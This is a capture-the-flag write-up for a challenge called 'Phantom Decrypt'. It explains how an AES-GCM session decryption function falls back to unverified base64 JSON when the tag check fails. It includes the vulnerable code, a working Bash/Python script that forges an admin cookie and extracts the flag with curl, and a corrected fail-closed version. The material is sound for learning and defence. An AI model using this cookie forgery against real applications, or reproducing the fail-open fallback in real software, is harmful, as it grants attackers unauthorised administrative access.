# Challenge - Phantom Decrypt

- Category: Cryptography  
- Difficulty: Medium  

This writeup shows how I solved **Phantom Decrypt** by abusing an insecure fallback in an AES‑GCM session decryption function, using a small Bash + Python script to forge an admin cookie.

---

## 1. Challenge Description

The challenge presents a Flask web app called **SecureVault** with:

- A login page.
- A dashboard that shows different content depending on the user’s role.
- Only users with role `admin` can see the **Admin Recovery Key** (the flag).

We are given:

- A downloadable file `public.zip`, AES-encrypted (password: `infected`), containing the application source code (`app.py`).
- Valid credentials: `guest / guest123` with role `viewer`.

The goal is to reach `/dashboard` as an **admin** and obtain the flag from the “Admin Recovery Key” section.

---

## 2. Reconnaissance

### Step 1: Extract Source Code

`public.zip` is AES-encrypted, so standard `unzip` fails. Instead:

```bash
7z x -p"infected" public.zip
```

This extracts `app.py`, which contains:

- `SECRET_KEY`: random 32‑byte AES key (unknown).
- `USERS`: hardcoded users where `guest` has password `guest123` and role `viewer`.
- `encrypt_session(data)`: JSON → AES‑256‑GCM → `base64(nonce + tag + ciphertext)`.
- `decrypt_session(cookie)`: AES‑GCM decryption logic with a dangerous error fallback.
- `/dashboard` route: decrypts `session_token` cookie, checks `role == "admin"`, and, if true, displays the flag.

### Step 2: Understand Cookie Format

The normal flow:

1. User logs in (`guest / guest123`).
2. Server builds a JSON session object, e.g.:

   ```json
   {
     "user": "guest",
     "role": "viewer",
     "iat": 1751600000
   }
   ```

3. `encrypt_session()`:

   - Generates a 12‑byte nonce.
   - Uses AES‑256‑GCM with the secret key.
   - Produces 16‑byte tag + ciphertext.
   - Concatenates `nonce || tag || ciphertext`.
   - Base64‑encodes the whole thing into `session_token`.

On `/dashboard`, the server reads `session_token` from the cookie and calls `decrypt_session()`.

---

## 3. Vulnerability in `decrypt_session`

The core function:

```python
def decrypt_session(cookie: str) -> dict:
    try:
        raw = base64.b64decode(cookie)
        nonce = raw[:12]
        tag = raw[12:28]
        ciphertext = raw[28:]
        cipher = AES.new(SECRET_KEY, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return json.loads(plaintext)
    except Exception:
        session_data = json.loads(base64.b64decode(cookie))
        return session_data
```

The problem:

- `decrypt_and_verify()` throws if the **authentication tag** is invalid (tampered ciphertext, wrong key, wrong nonce, etc.).[web:21][web:24]
- Instead of rejecting the cookie, the `except Exception` block:

  1. Base64‑decodes the cookie again.
  2. Interprets it as **raw JSON** with no cryptographic verification.

This means any malformed or intentionally crafted cookie that **fails AES‑GCM verification** is treated as a plain base64‑encoded JSON blob. We can forge arbitrary session data, including `"role": "admin"`, without knowing the AES key or producing a valid GCM tag.[web:28][web:30]

This completely bypasses the integrity guarantees of AES‑GCM: if the tag check fails, correct behavior is to *fail closed* (reject the ciphertext).[web:21][web:24]

---

## 4. Exploit Idea

Given the insecure fallback:

1. We don’t need to produce a valid AES‑GCM ciphertext.
2. We only need a base64‑encoded JSON string containing:

   ```json
   {
     "user": "admin",
     "role": "admin",
     "iat": <current timestamp>
   }
   ```

3. When the server tries to decrypt it:

   - AES‑GCM decryption will fail (cookie is not a valid ciphertext).
   - The `except Exception` block will parse our cookie as JSON.
   - `decrypt_session()` returns our forged session data.
   - `/dashboard` sees `role == "admin"` and prints the flag.

So the attack is a pure **application logic bug**: cryptography is implemented correctly, but error handling silently destroys security.

---

## 5. Exploit Script (My Solution)

Instead of manually building and sending the cookie each time, I wrote a short Bash script that:

- Generates an admin JSON session in Python.
- Base64‑encodes it.
- Sends it as `session_token` cookie to `/dashboard`.
- Extracts the flag from the HTML response.

```bash
cat > get_flag.sh <<'SH'
#!/usr/bin/env bash
set -euo pipefail

HOST="https://INSTANCE.chal.ctf.ae"

COOKIE=$(python3 - <<'PY'
import base64, json, time

data = {
    "user": "admin",
    "role": "admin",
    "iat": int(time.time())
}

print(base64.b64encode(json.dumps(data, separators=(",", ":")).encode()).decode())
PY
)

echo "[+] Host: $HOST"
echo "[+] Forged admin cookie:"
echo "$COOKIE"
echo
echo "[+] Sending request..."

curl -sk "$HOST/dashboard" \
  -H "Cookie: session_token=$COOKIE" \
| tee response.html \
| grep -oP '<div class="flag-value">\K[^<]+'
SH

chmod +x get_flag.sh
./get_flag.sh
```

### Why This Works

- The Python snippet builds a **minimal JSON** object with:

  ```json
  {"user":"admin","role":"admin","iat":<now>}
  ```

  and base64‑encodes it.

- This string becomes the `session_token` cookie.
- On the server:

  1. `base64.b64decode(cookie)` succeeds.
  2. Split into `nonce/tag/ciphertext` (nonsense values).
  3. `decrypt_and_verify()` fails, raising an exception because the tag does not match.[web:21][web:24]
  4. `except Exception` runs:
     - Decodes the same base64 again.
     - Parses it as JSON.
     - Returns our forged session object `{user: "admin", role: "admin", ...}`.

- `/dashboard` sees `role == "admin"` and renders the admin view with the flag in `<div class="flag-value">...</div>`.
- `grep -oP` extracts just the flag value from the HTML, making the exploit script fully automated.

---

## 6. Server Response and Flag

Running `./get_flag.sh` yields an HTML dashboard like:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>SecureVault - Dashboard</title>
</head>
<body>
  <h1>Dashboard</h1>
  <p>User: admin | Role: admin</p>
  <p><b>Admin Recovery Key:</b> <div class="flag-value">flag{................}</div></p>
</body>
</html>
```

The script extracts:

```text
flag{....................}
```

---

## 7. Lessons Learned & Fix

### What Went Wrong

- AES‑256‑GCM is a good choice for session encryption: it provides both confidentiality and integrity via the authentication tag.[web:21][web:24]
- But the implementation’s error handling **destroyed** the integrity property:
  - On any decryption failure, it falls back to unauthenticated JSON.
  - This is equivalent to having no MAC at all for forged cookies.

This pattern is a classic “phantom security” issue: cryptography is present, but a logical mistake makes it irrelevant.

### Key Takeaways

- **Never** fall back to a weaker, unauthenticated path when cryptographic verification fails.
- Catch **specific exceptions** and treat any tag mismatch as a hard authentication error.
- Authentication and session validation must **fail closed**: if a token cannot be verified, deny access.
- Source code review is crucial: this bug is obvious once you read `decrypt_session()`, but invisible from the outside.

### Proper Remediation

A secure `decrypt_session()` should reject invalid tokens:

```python
def decrypt_session(cookie: str) -> dict:
    try:
        raw = base64.b64decode(cookie)
        nonce = raw[:12]
        tag = raw[12:28]
        ciphertext = raw[28:]
        cipher = AES.new(SECRET_KEY, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return json.loads(plaintext)
    except Exception:
        raise ValueError("Invalid session token")
```

Then in `/dashboard`, on any `Invalid session token`:

- Clear the cookie.
- Redirect to the login page.
- Log the event if needed.

With that fix, our forged base64 JSON cookie would be rejected, and the **Phantom Decrypt** attack would no longer work.
